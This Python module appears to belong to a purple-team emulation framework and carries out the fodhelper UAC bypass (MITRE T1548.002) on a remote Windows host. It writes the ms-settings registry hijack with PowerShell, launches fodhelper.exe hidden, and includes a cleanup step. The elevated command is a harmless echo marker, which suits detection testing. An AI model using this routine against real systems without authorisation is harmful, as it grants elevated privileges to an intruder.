from __future__ import annotations

import logging
from typing import Any

from purplestrike.models.techniques import ExecutionStatus, TechniqueResult
from purplestrike.techniques.connection import TargetConnection, command_error, get_connection

logger = logging.getLogger(__name__)
_created_targets: set[str] = set()


async def execute(target: str, parameters: dict[str, Any]) -> TechniqueResult:
    """Bypass UAC via fodhelper registry key manipulation."""
    conn: TargetConnection | None = None
    try:
        method = parameters.get("method", "fodhelper")
        conn = await get_connection(target)
        if method == "fodhelper":
            setup_results = []
            setup_results.append(await conn.run_ps(
                "if (Test-Path -LiteralPath 'HKCU:\\Software\\Classes\\ms-settings') "
                "{ throw 'Existing ms-settings registration will not be overwritten' }; "
                "New-Item -Path 'HKCU:\\Software\\Classes\\ms-settings'"
                " -Force | Out-Null"
            ))
            if not setup_results[0].success:
                raise RuntimeError(command_error(setup_results[0]))
            _created_targets.add(target)
            setup_results.append(await conn.run_ps(
                "New-Item -Path "
                "'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command'"
                " -Force | Out-Null"
            ))
            setup_results.append(await conn.run_ps(
                "New-ItemProperty -Path "
                "'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command'"
                " -Name 'DelegateExecute' -Value '' -PropertyType String "
                "-Force | Out-Null"
            ))
            setup_results.append(await conn.run_ps(
                "New-ItemProperty -Path "
                "'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command'"
                " -Name '(Default)' -Value 'cmd.exe /c echo UAC_BYPASS_TEST' "
                "-PropertyType String -Force | Out-Null"
            ))
            failed = next((result for result in setup_results if not result.success), None)
            if failed is not None:
                return TechniqueResult(
                    technique_id="T1548.002",
                    success=False,
                    output=failed.stdout[:4096],
                    error=command_error(failed)[:1024],
                    execution_status=ExecutionStatus.FAILURE,
                )
            verify = await conn.run_ps(
                "Get-ItemProperty -Path "
                "'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command' "
                "| Format-List"
            )
            if not verify.success:
                return TechniqueResult(
                    technique_id="T1548.002",
                    success=False,
                    output=verify.stdout[:4096],
                    error=command_error(verify)[:1024],
                    execution_status=ExecutionStatus.FAILURE,
                )
            trigger = await conn.run_ps(
                "Start-Process 'fodhelper.exe' -WindowStyle Hidden; "
                "Start-Sleep -Seconds 2; "
                "'fodhelper.exe launched with UAC bypass registry'"
            )
            return TechniqueResult(
                technique_id="T1548.002",
                success=trigger.success,
                output=verify.stdout[:2048] + "\n" + trigger.stdout[:2048],
                error=trigger.stderr[:1024] if not trigger.success else None,
                execution_status=ExecutionStatus.SUCCESS if trigger.success else ExecutionStatus.FAILURE,
            )
        return TechniqueResult(
            technique_id="T1548.002",
            success=False,
            error=f"Unknown method: {method}",
            execution_status=ExecutionStatus.FAILURE,
        )
    except Exception as e:
        logger.error(f"T1548.002 execution failed: {e}")
        return TechniqueResult(
            technique_id="T1548.002",
            success=False,
            error=str(e),
            execution_status=ExecutionStatus.FAILURE,
        )
    finally:
        if conn:
            await conn.disconnect()


async def cleanup(target: str) -> None:
    """Reverse any changes made during execution."""
    conn: TargetConnection | None = None
    try:
        if target not in _created_targets:
            return
        conn = await get_connection(target)
        result = await conn.run_ps(
            "Remove-Item -Path 'HKCU:\\Software\\Classes\\ms-settings' "
            "-Recurse -Force -ErrorAction SilentlyContinue"
        )
        if not result.success:
            raise RuntimeError(command_error(result))
        _created_targets.discard(target)
    except Exception as e:
        logger.warning(f"T1548.002 cleanup failed: {e}")
    finally:
        if conn:
            await conn.disconnect()
